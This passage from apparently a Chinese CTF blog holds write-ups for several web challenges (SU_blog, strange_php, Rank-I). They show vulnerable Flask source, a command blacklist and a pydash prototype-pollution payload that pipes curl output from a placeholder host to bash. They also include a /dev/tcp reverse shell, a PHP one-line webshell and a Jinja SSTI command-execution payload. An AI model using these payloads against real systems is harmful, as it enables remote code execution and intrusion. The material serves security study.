class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无权访问该文件。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    file_path = os.path.join(BASE_DIR, file_name)</span><br><span class="line">    file_path = file_path.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)    <span class="comment"># 双写绕过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 可以读取任意文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        content = <span class="string">&quot;文件未找到。&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;Error reading file <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        content = <span class="string">&quot;读取文件时发生错误。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里应该是重点</span></span><br><span class="line"><span class="string">post请求，get中pass=SUers</span></span><br><span class="line"><span class="string">post传json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user_data ssti?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;pass&#x27;</span>)!=<span class="string">&quot;SUers&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = request.json</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> body:</span><br><span class="line">                flash(<span class="string">&quot;No JSON data received&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;No JSON data received&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            key = body.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">            value = body.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flash(<span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pwaf(key):</span><br><span class="line">                flash(<span class="string">&quot;Invalid key format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid key format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cwaf(value):</span><br><span class="line">                flash(<span class="string">&quot;Invalid value format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid value format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            set_(user_data, key, value)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;User data updated successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;User data updated successfully&quot;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">            flash(<span class="string">&quot;Invalid JSON data&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flash(<span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, user_data=user_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># 重置你的session</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    flash(<span class="string">&quot;You have been logged out.&quot;</span>, <span class="string">&quot;info&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">10006</span>)</span><br></pre></td></tr></table></figure></li></ol></li><li><p>解决方法一：&#x2F;Admin SSTI | FALSE</p><ol><li><p>打&#x2F;Admin的ssti，绕过waf</p></li><li><p>emm，还有个pydash，没那么简单，还需要再想想</p></li><li><p>需要再读admin.html: &#x2F;article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;templates&#x2F;admin.html</p><ol><li>返回如下<ol><li>user_data，emm是个对象啊bro，这么玩，无回显？大那是可以写入和读取吧</li></ol></li></ol>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span>Processed Data:<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>&#123;&#123; user_data &#125;&#125;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-secondary&quot;</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>解决方法二：其他ssti | FALSE</p><ol><li><p>如果只是ssti的话，在&#x2F;article打不是更好？不用articles&#x2F;开头就render file_name了，读一下article.html</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Article - &#123;&#123; file_name &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;&#123; content | safe &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>不对不对，ssti不是这样</p></li></ol></li><li><p>解决方法三：python pp | True</p><ol><li><p>waf和pydash(原型链)，这里应该需要到rce，至少是列目录</p></li><li><p>说到列目录，似乎见过这种题，但是这里不适用emm</p></li><li><p>那就只能rce了，结合[<a href="https://tttang.com/archive/1876/]%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%80%9D%E8%B7%AF">https://tttang.com/archive/1876/]，有两种思路</a></p><ol><li>直接打rce(是作为模板编译时的处理代码的一部分，同样受到模板缓存的影响，也就是说这里插入的payload只会在模板在第一次访问时触发)</li><li>修改render的识别符号，来进行ssti(也需要考虑缓存)</li></ol></li><li><p>关于waf.py可以黑名单测试也可以读一下(居然是非预期): &#x2F;article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;waf..&#x2F;.py</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> key_blacklist = [</span><br><span class="line">    <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;router&#x27;</span>, <span class="string">&#x27;name_index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;directory_handler&#x27;</span>, <span class="string">&#x27;directory_view&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;_static_folder&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,  <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">value_blacklist = [</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;nl&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;tail&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;cut&#x27;</span>, <span class="string">&#x27;awk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;strings&#x27;</span>, <span class="string">&#x27;od&#x27;</span>, <span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;ch&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;sl&#x27;</span>, <span class="string">&#x27;find&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;mv&#x27;</span>, <span class="string">&#x27;ty&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;fd&#x27;</span>, <span class="string">&#x27;df&#x27;</span>, <span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;tac&#x27;</span>, <span class="string">&#x27;less&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;head&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;gcc&#x27;</span>, <span class="string">&#x27;uniq&#x27;</span>, <span class="string">&#x27;vi&#x27;</span>, <span class="string">&#x27;vim&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;xxd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;readflag&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将黑名单转换为字节串</span></span><br><span class="line">key_blacklist_bytes = [word.encode() <span class="keyword">for</span> word <span class="keyword">in</span> key_blacklist]</span><br><span class="line">value_blacklist_bytes = [word.encode() <span class="keyword">for</span> word <span class="keyword">in</span> value_blacklist]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_blacklist</span>(<span class="params">data, blacklist</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwaf</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># 将 key 转换为字节串</span></span><br><span class="line">    key_bytes = key.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_blacklist(key_bytes, key_blacklist_bytes):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Key contains blacklisted words.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cwaf</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">77</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Value exceeds 77 characters.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将 value 转换为字节串</span></span><br><span class="line">    value_bytes = value.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_blacklist(value_bytes, value_blacklist_bytes):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Value contains blacklisted words.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="SU-blog-复现-SV"><a href="#SU-blog-复现-SV" class="headerlink" title="SU_blog 复现 | SV"></a>SU_blog 复现 | SV</h3><blockquote><p>也算是分析出来了，就是操作上有一些麻烦，在这里试试</p></blockquote><ol><li><p>直接上payload</p><ol><li><strong>一开始这一步忘记了</strong>: 运行完脚本后访问一个模板就可以执行命令了</li><li>这里实际环境会隔两分钟刷新，要卡刷新后第一次访问模板，实战中应该是要在python中发然后随时看nc端口的</li><li>SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### /Admin ssti</span></span><br><span class="line">path_admin=<span class="string">&quot;/Admin&quot;</span></span><br><span class="line">admin_params=&#123;</span><br><span class="line">    <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;SUers&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">admin_json=&#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;curl http://xxx/ | bash&#x27;);#&quot;</span>    <span class="comment"># 应该是有长度限制</span></span><br><span class="line">&#125;</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>,<span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIn0.Z4-3cw.2M6wNP8P2Wh6W2YtNylsZRzhMzw&quot;</span>)  <span class="comment"># 指定给定的session键值对</span></span><br><span class="line">r = session.post(url=host+path_admin, params=admin_params, json=admin_json, proxies=proxies,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index.html或者kc1zsa4.sh</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&quot;</span></span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:xxx kc1zs4.sh</span><br><span class="line">nc -lvvp xxx</span><br></pre></td></tr></table></figure></li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="SU-blog总结"><a href="#SU-blog总结" class="headerlink" title="SU_blog总结"></a>SU_blog总结</h3><blockquote><p>[<a href="https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/]">https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/]</a></p></blockquote><ul><li><input disabled="" type="checkbox"> 敏感文件泄露</li><li><input disabled="" type="checkbox"> flask session机制</li><li><input disabled="" type="checkbox"> 反弹shell</li><li><input disabled="" type="checkbox"> 这里路径的拼接怎么办</li></ul><blockquote><p>还是需要再敏感一点的，pydash首先考虑，ssti没理解到位</p></blockquote><ol><li>&#x2F;etc&#x2F;passwd</li><li>apache，nginx配置文件获取运行目录</li><li>&#x2F;proc目录<ol><li>&#x2F;proc&#x2F;1&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;cmdline</li><li>[<a href="https://blog.csdn.net/cosmoslin/article/details/122660083]">https://blog.csdn.net/cosmoslin/article/details/122660083]</a></li></ol></li><li>日志文件</li></ol><h3 id="SU-photogallery总结"><a href="#SU-photogallery总结" class="headerlink" title="SU_photogallery总结"></a>SU_photogallery总结</h3><ul><li><input checked="" disabled="" type="checkbox"> http上传文件</li><li><input checked="" disabled="" type="checkbox"> python上传文件</li><li><input disabled="" type="checkbox"> python生成文件</li><li><input disabled="" type="checkbox"> zipslip</li></ul><ol><li>一个思想是安全漏洞和版本与<strong>环境</strong>是紧密相关，还是要足够发散和细心</li><li>复现不出来可以看看解释，找到的文章里就有，不要太急急急</li><li>列idea是一个好习惯啊，安全与**错误返回和错误不返回(逻辑漏洞)**也是息息相关的</li><li>绕黑名单的传入思想是不错的: <code>&lt;?php ($_GET[&#39;kc1zs4&#39;])($_POST[&#39;kc1zs4&#39;]);</code></li><li>这一题还有一个意识，条件竞争再测试环境下不太行</li></ol><h3 id="SU-POP总结"><a href="#SU-POP总结" class="headerlink" title="SU_POP总结"></a>SU_POP总结</h3><ul><li><input disabled="" type="checkbox"> <code>$this -&gt; $name</code>和<code>$this -&gt; name</code></li><li><input disabled="" type="checkbox"> 这里Response.php中的stream怎么办</li><li><input disabled="" type="checkbox"> 补充一点php命名空间的学习，顺便梳理清除一下php的session和file upload这些内容吧，还有变量类型是什么鬼</li></ul><ol><li>这种类型题目复现先理解链子后再手动找，不然卡到啥的要复现很久</li><li>官方的pop链也可以看看，有点意思，只有三环</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>25春秋冬季联赛</title>
      <link href="/2025/01/20/25%E6%98%A5%E7%A7%8B%E5%86%AC%E5%AD%A3%E8%81%94%E8%B5%9B/"/>
      <url>/2025/01/20/25%E6%98%A5%E7%A7%8B%E5%86%AC%E5%AD%A3%E8%81%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>看来两题，感觉还是有些东西，看看wp学学东西</p></blockquote><h2 id="file-copy-php-filter-chain"><a href="#file-copy-php-filter-chain" class="headerlink" title="file_copy | php_filter_chain"></a>file_copy | php_filter_chain</h2><ol><li>copy函数漏洞攻击<ol><li>这里的思路类似于get_contents到rce, phar这些，属于特殊函数的漏洞</li><li>总结一下<a href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">php_filter_chain</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>24DasctfX0x401</title>
      <link href="/2025/01/20/24DasctX0x401/"/>
      <url>/2025/01/20/24DasctX0x401/</url>
      
        <content type="html"><![CDATA[<h2 id="strange-php-复现"><a href="#strange-php-复现" class="headerlink" title="strange_php | 复现"></a>strange_php | 复现</h2><blockquote><p>差一步但也差亿点啊，这个pop链是真没有想到，还得练意识</p></blockquote><ol><li>一眼应该是反序列化？</li><li>是password_hash创建的密码</li><li>可能考点<ol><li>有文件覆写phar？</li><li>有session，反序列化？</li><li>有sleep竞争</li><li>login处进入welcome.php</li><li>login处重置了session为user_id</li></ol></li><li>切入点好多，得慢慢看了<ol><li>关于session反序列化，user_id其实是不可控的，可控的只有username，session中存有user_id和file_path</li><li>思路的切入在于可控点和利用点<ol><li>可控点<ol><li>deleteMessage中的path</li><li>User中可以通过控制username来写入log&#x2F;md5(username).txt文件，main函数结束后调用__destruct</li></ol></li><li>利用点<ol><li>应该是在welcome.php中</li></ol></li></ol></li></ol></li><li>尝试<ol><li>注册用户admin，报错，有重复的用户，不错，这里也没有权限控制需要用到的，不管了，admin:admin，emm，居然进了，但是不是考点；接下来就是welcome.php中的利用点了</li><li>这里有一个file_existed在delete处，而且也完全可控，打phar？那么利用点在哪里？有一个__set()可以读取文件？readMessage()中也有阿？<ol><li>however，__set()处是可控的</li><li>找pop链子了<ol><li><p>马萨卡还要套一个session反序列化吗？这个__set还要指定是filePath，找不到了555</p></li><li><p><strong>看看gxngxn的</strong></p><ol><li>注意最后是直接访问即可，因为是.&#x2F;不是&#x2F;</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用pdo设置pop链，很强大gxngxn</span></span><br><span class="line">User-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">User-&gt;<span class="title function_ invoke__">log</span>()</span><br><span class="line">User-&gt;conn-&gt;<span class="title function_ invoke__">get_connection</span>()</span><br><span class="line">UserMessage-&gt;<span class="title function_ invoke__">__set</span>(...)</span><br><span class="line">   <span class="comment">// 可以成功读取到/flag文件</span></span><br><span class="line">   <span class="comment">// 写入后delete触发</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 随后访问一下./log/md5(username).txt即可</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol></li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol><li>session_start时进行加载？</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2025</title>
      <link href="/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/"/>
      <url>/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/</url>
      
        <content type="html"><![CDATA[<h2 id="Rank-I-SV"><a href="#Rank-I-SV" class="headerlink" title="Rank-I | SV"></a>Rank-I | SV</h2><blockquote><p>唯一做出来一道55</p></blockquote><ol><li>起来黑盒，有点懵逼</li><li>dirsearch开扫，发现&#x2F;console，查看响应包，发现js代码执行(xss)，however没用啊<ol><li>xss并无法302，在浏览器执行后相当于输入url，重定向没有用</li><li>此处没有别的用户，xss没有作用</li></ol></li><li>马萨卡要http头注入来访问&#x2F;console？但是没有多余信息，ctf中没有见过</li><li>这种可以报错看看，&#x2F;login和&#x2F;cpass的post请求置空，发现熟悉的flask报错<ol><li>有phone&#x3D;1686682318，password&#x3D;Happy_news_admin，但是没有用bro</li><li>user_input有黑名单，这里phone的黑名单，干啥勒<ol><li><img src="/pic/25%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/rank_i_bl.png" alt="pic"></li><li>直接执行命令，可以试试ssti这里是</li></ol></li></ol></li><li>14，ok，是模板注入，绕过只需要绕过/即可了，首先想到编码+拼接，ascii可以 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://139.155.126.78:26575&quot;</span></span><br><span class="line">path_root=<span class="string">&quot;/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 登录</span></span><br><span class="line">path_login=<span class="string">&quot;/login&quot;</span></span><br><span class="line">login_data = &#123;</span><br><span class="line">    <span class="string">&quot;phone_number&quot;</span>: <span class="string">&quot;&#123;%set chr=g.pop.__globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import_&#x27;+&#x27;_&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).popen(chr(110)+chr(108)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(102)+chr(49)+chr(52)+chr(57)).read()&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_login,data=login_data,proxies=proxies, timeout=<span class="number">5</span>)</span><br><span class="line">path_cpass=<span 